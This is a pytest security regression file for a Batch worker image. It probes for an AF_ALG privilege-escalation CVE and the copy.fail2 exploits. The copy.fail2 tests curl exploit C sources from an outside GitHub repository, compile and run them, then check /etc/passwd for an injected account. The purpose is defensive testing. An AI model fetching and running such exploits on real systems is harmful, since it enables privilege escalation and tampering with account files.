"""
Security regression tests for the Batch worker image.

Validates that worker nodes are not vulnerable to:
  - copy.fail / CVE-2026-31431 (AF_ALG socket privilege escalation)
  - copy.fail2 (IPv4 and IPv6 variants)

Each test submits a Batch job that probes the host kernel. The job exits
non-zero if it detects a vulnerable condition, causing the pytest assertion
to fail. Tests pass only when the worker image is demonstrably safe.
"""

import pytest

from hailtop.batch_client.client import BatchClient

from .utils import DOCKER_ROOT_IMAGE, create_batch

_COPYFAIL2_REPO = 'https://raw.githubusercontent.com/0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo/main'

_AF_ALG_CHECK = r"""
python3 - <<'PYEOF'
import socket, sys
try:
    s = socket.socket(38, 5, 0)  # AF_ALG=38, SOCK_SEQPACKET=5
    s.bind(('aead', 'authencesn(hmac(sha256),cbc(aes))'))
    print('[!] VULNERABLE: AF_ALG socket creation succeeded (CVE-2026-31431)')
    s.close()
    sys.exit(1)
except OSError as e:
    if e.errno in (97, 2):  # EAFNOSUPPORT or ENOENT
        print(f'[+] SAFE: AF_ALG blocked (errno={e.errno})')
        sys.exit(0)
    print(f'[?] UNEXPECTED socket error: {e}')
    sys.exit(1)
PYEOF
"""


def _copyfail2_command(variant: str) -> str:
    assert variant in ('v4', 'v6')
    src_url = f'{_COPYFAIL2_REPO}/copyfail2.c' if variant == 'v4' else f'{_COPYFAIL2_REPO}/ipv6/copyfail2v6.c'
    src_file = 'copyfail2.c' if variant == 'v4' else 'copyfail2v6.c'
    binary = 'copyfail2' if variant == 'v4' else 'copyfail2v6'
    return f"""
set -x
WORKDIR=/tmp/copyfail2_{variant}
mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo "=== kernel: $(uname -r) ==="

apt-get update -qq
DEBIAN_FRONTEND=noninteractive apt-get install -y -qq gcc libssl-dev curl iproute2

curl -fsSL '{_COPYFAIL2_REPO}/aa-rootns.c' -o aa-rootns.c || {{ echo '[-] download aa-rootns.c failed'; exit 1; }}
curl -fsSL '{src_url}' -o {src_file} || {{ echo '[-] download {src_file} failed'; exit 1; }}

if ! gcc -O2 -Wall {src_file} -o {binary} -lcrypto 2>&1; then
    echo '[-] {binary} compilation failed — cannot verify safety'
    exit 1
fi
if ! gcc -O2 -Wall aa-rootns.c -o aa-rootns 2>&1; then
    echo '[-] aa-rootns compilation failed — cannot verify safety'
    exit 1
fi

timeout 30 ./{binary} 2>&1 || true

if grep -q '^sick:' /etc/passwd; then
    echo '[!!!] VULNERABLE: sick entry written to /etc/passwd'
    exit 1
fi
echo '[+] NOT VULNERABLE: no sick entry found in /etc/passwd'
"""


@pytest.mark.timeout(5 * 60)
def test_no_af_alg_socket(client: BatchClient):
    """CVE-2026-31431: AF_ALG socket creation must be blocked on worker nodes."""
    b = create_batch(client)
    j = b.create_job('python:3.11-slim', ['/bin/sh', '-c', _AF_ALG_CHECK])
    b.submit()
    status = j.wait()
    assert status['state'] == 'Success', str((status, b.debug_info()))


@pytest.mark.timeout(10 * 60)
def test_no_copyfail2_v4(client: BatchClient):
    """copy.fail2 IPv4: privilege escalation via copy.fail2 must not succeed."""
    b = create_batch(client)
    j = b.create_job(DOCKER_ROOT_IMAGE, ['/bin/sh', '-c', _copyfail2_command('v4')])
    b.submit()
    status = j.wait()
    assert status['state'] == 'Success', str((status, b.debug_info()))


@pytest.mark.timeout(10 * 60)
def test_no_copyfail2_v6(client: BatchClient):
    """copy.fail2 IPv6: privilege escalation via copy.fail2v6 must not succeed."""
    b = create_batch(client)
    j = b.create_job(DOCKER_ROOT_IMAGE, ['/bin/sh', '-c', _copyfail2_command('v6')])
    b.submit()
    status = j.wait()
    assert status['state'] == 'Success', str((status, b.debug_info()))
